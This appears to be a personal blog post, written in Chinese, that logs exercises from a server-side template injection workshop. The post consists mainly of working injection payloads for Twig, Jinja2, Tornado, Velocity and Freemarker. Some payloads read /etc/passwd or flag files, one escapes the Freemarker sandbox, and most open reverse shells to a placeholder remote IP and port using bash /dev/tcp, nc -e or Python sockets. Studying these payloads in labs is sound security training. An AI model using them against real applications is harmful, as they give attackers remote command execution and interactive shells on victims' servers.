---
layout: post
title:  Learning SSTI with gosecure
subtitle: Gosecure的SSTI环境学习记录
tags: [ssti,websec]
---

## 环境地址
gosecure 的ssti教程地址[template-injection-workshop](https://gosecure.github.io/template-injection-workshop/#0)

## LAB 1: Twig (PHP)
```
email={{_self.env.registerUndefinedFilterCallback("exec")}}{{_self.env.getFilter("/bin/bash -c \"/bin/bash -i >%26 /dev/tcp/your_remote_ip/port 0>%261\"")}}&submit=
```
原理可以参考[Twig SSTI](https://github.com/EdOverflow/bugbountywiki/wiki/SSTI)。  

问题：
直接bash -i /dev/tcp/ip/port 的时候，报错"/dev/tcp no such file or directory"，搜索发现是因为使用的是exec函数，不能直接处理重定向。参考[/dev/tcp](https://stackoverflow.com/questions/36022331/bash-i-dev-tcp-127-0-0-1-1234-01)，使用`bash -c`可以成功。


## LAB 2: Jinja2 (Python)
```
name={{''.__class__.__mro__[2].__subclasses__()[40]('/etc/passwd','r').read()}}&org=1&phone=33&email=44
```
查找`subprocess.Popen`
```
{% for item in ''.__class__.__mro__[2].__subclasses__()%}
        {%- if item.__name__ == 'Popen' -%}
        {{loop.index0}}{{item}}
{%- endif -%}
    {% endfor %}
```

shell
```
{{''.__class__.__mro__[2].__subclasses__()[245](["/bin/bash","-c","/bin/bash -i >%26 /dev/tcp/your_remote_ip/port 0>%261"])}}
```

## LAB 3: Tornado (Python)

```
{[remove]%import subprocess,socket,os%}{{s=socket.socket(socket.AF_INET,socket.SOCK_STREAM)}}{{s.connect(("your_remote_ip",port))}}{{os.dup2(s.fileno(),0)}}{{ os.dup2(s.fileno(),1)}}{{ os.dup2(s.fileno(),2)}}{{p=subprocess.call(["/bin/sh","-i"])}}
```

```
{[remove]%import subprocess%} {{subprocess.Popen(["nc","your_remote_ip","port","-e","/bin/sh"])}}
```

## LAB 4: Velocity (Java)
猜密码猜了半天没有猜对，最后还是去看了一下代码才找到密码。  
检测：
```
#set($x=7*7)$x
```
```
#set($x='')#set($rt=$x.class.forName('java.lang.Runtime'))#set($chr=$x.class.forName('java.lang.Character'))#set($str=$x.class.forName('java.lang.String'))#set($ex=$rt.getRuntime().exec('cat secret/flag.txt'))$ex.waitFor()#set($out=$ex.getInputStream())#foreach($i in [1..$out.available()])$str.valueOf($chr.toChars($out.read()))#end
```

```
#set($x='')#set($rt=$x.class.forName('java.lang.Runtime'))#set($chr=$x.class.forName('java.lang.Character'))#set($str=$x.class.forName('java.lang.String'))#set($ex=$rt.getRuntime().exec('nc your_rermote_ip port -e /bin/sh '))$ex.waitFor()
```

## LAB 5: Freemarker (Java)
检测：
```
${7*7}
```

```
<#assign ex="freemarker.template.utility.Execute"?new()> ${ ex("cat secret/flag.txt") }
```

```
<#assign ex="freemarker.template.utility.Execute"?new()> ${ ex("nc your_remote_ip port -e /bin/sh  ") }
```

## LAB 6: Freemaker (Sandbox escape)
```
<#list .data_model as key, object_test>

<b>Testing "${key}":</b><br/>
<#attempt>

<#assign classloader=object_test.class.protectionDomain.classLoader>
<#assign owc=classloader.loadClass("freemarker.template.ObjectWrapper")>
<#assign dwf=owc.getField("DEFAULT_WRAPPER").get(null)>
<#assign ec=classloader.loadClass("freemarker.template.utility.Execute")>

Shell ! ( 
${dwf.newInstance(ec,null)("nc your_remote_ip port -e /bin/sh")}
)

<#recover>
failed
</#attempt>

<br/><br/>
</#list>
```

## 总结
经过案例练习，了解了ssti的实际场景和检测方式。实际利用一方面是积累利用方式，另一方面需要了解语言特性才有可能找到gadget。  

感谢网络上各位的分享。

* [Template Injection in Action](https://gosecure.github.io/template-injection-workshop/)
* [Server-Side Template Injection](https://portswigger.net/research/server-side-template-injection)
